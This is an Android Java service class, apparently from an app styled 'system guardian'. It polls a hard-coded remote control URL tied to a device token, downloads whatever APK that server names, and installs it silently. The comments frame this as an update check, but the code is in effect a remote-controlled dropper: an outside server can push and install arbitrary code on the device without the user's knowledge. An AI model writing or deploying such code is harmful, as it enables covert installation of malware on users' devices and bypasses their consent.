package com.system.guardian;

import android.content.Context;
import android.content.Intent;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.core.app.JobIntentService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;

/**
 * Service that polls the control endpoint and installs APK if update is available.
 */
public class ControlPollerService extends JobIntentService {

    private static final int JOB_ID = 1001;

    public static void enqueueWork(Context context, Intent work) {
        enqueueWork(context, ControlPollerService.class, JOB_ID, work);
    }

    @Override
    protected void onHandleWork(@NonNull Intent intent) {
        String deviceToken = "535ef8dad6992485";  // TODO: Load dynamically if possible
        String url = "https://digiserve25.pythonanywhere.com/control/" + deviceToken + ".json";

        JSONObject response = NetworkUtils.getJsonFromUrl(url);
        if (response != null && response.has("apk_url")) {
            try {
                String apkUrl = response.getString("apk_url");

                if (!apkUrl.isEmpty()) {
                    Log.i("APK_FETCH", "Downloading new APK: " + apkUrl);
                    File apkFile = NetworkUtils.downloadFile(getApplicationContext(), apkUrl, "update.apk");
                    SilentApkInstaller.installSilently(this, apkFile);
                }

            } catch (JSONException e) {
                Log.e("APK_FETCH", "Failed to parse APK URL from control response", e);
            } catch (Exception e) {
                Log.e("APK_FETCH", "Unexpected error downloading APK", e);
            }
        } else {
            Log.i("APK_FETCH", "No APK update found in control response");
        }
    }
}
